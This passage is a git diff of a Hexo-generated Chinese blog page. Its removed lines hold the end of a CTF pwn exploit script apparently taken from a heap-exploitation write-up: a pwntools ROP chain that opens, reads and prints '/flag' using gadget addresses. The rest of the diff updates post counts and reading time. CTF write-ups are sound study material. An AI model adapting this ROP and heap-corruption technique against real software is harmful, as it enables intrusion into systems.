<span class="number">0x100</span>)                   <span class="comment"># chunk #8</span></span><br><span class="line">chunk8_addr = chunk1_addr + <span class="number">0x410</span></span><br><span class="line"></span><br><span class="line">ROP = <span class="string">b&#x27;/flag&#x27;</span>.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>)     <span class="comment"># 0x0</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0x10</span>)          <span class="comment"># 0x30</span></span><br><span class="line">ROP += p64(poprsi_ret)                  <span class="comment"># 0x38</span></span><br><span class="line">ROP += p64(<span class="number">2</span>)                           <span class="comment"># 0x40</span></span><br><span class="line">ROP += p64(openfile)                    <span class="comment"># 0x48</span></span><br><span class="line">ROP += p64(poprdi_ret)                  <span class="comment"># 0x50</span></span><br><span class="line">ROP += p64(<span class="number">3</span>)                           <span class="comment"># 0x58</span></span><br><span class="line">ROP += p64(poprsi_ret)                  <span class="comment"># 0x60</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0xF0</span>)          <span class="comment"># 0x68</span></span><br><span class="line">ROP += p64(poprdx_ret)                  <span class="comment"># 0x70</span></span><br><span class="line">ROP += p64(<span class="number">0x30</span>)                        <span class="comment"># 0x78</span></span><br><span class="line">ROP += p64(readfile)                    <span class="comment"># 0x80</span></span><br><span class="line">ROP += p64(poprdi_ret)                  <span class="comment"># 0x88</span></span><br><span class="line">ROP += p64(<span class="number">1</span>)                           <span class="comment"># 0x90</span></span><br><span class="line">ROP += p64(addrsp0x18_ret)              <span class="comment"># 0x98</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0x40</span>)          <span class="comment"># 0xA0</span></span><br><span class="line">ROP += p64(poprdi_ret)                  <span class="comment"># 0xA8</span></span><br><span class="line">ROP += p64(<span class="number">0xdeadbeef</span>)                  <span class="comment"># 0xB0</span></span><br><span class="line">ROP += p64(poprsi_ret)                  <span class="comment"># 0xB8</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0xF0</span>)          <span class="comment"># 0xC0</span></span><br><span class="line">ROP += p64(poprdx_ret)                  <span class="comment"># 0xC8</span></span><br><span class="line">ROP += p64(<span class="number">0x30</span>)                        <span class="comment"># 0xD0</span></span><br><span class="line">ROP += p64(writefile)                   <span class="comment"># 0xD8</span></span><br><span class="line">edit(<span class="number">8</span>, ROP)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1987,7 +2028,7 @@ show与edit相同，也是只能展示前30字节。</p>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">161</span>
+          <span class="site-state-item-count">162</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2045,7 +2086,7 @@ show与edit相同，也是只能展示前30字节。</p>
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">22:29</span>
+    <span title="站点阅读时长">22:50</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
   </div>
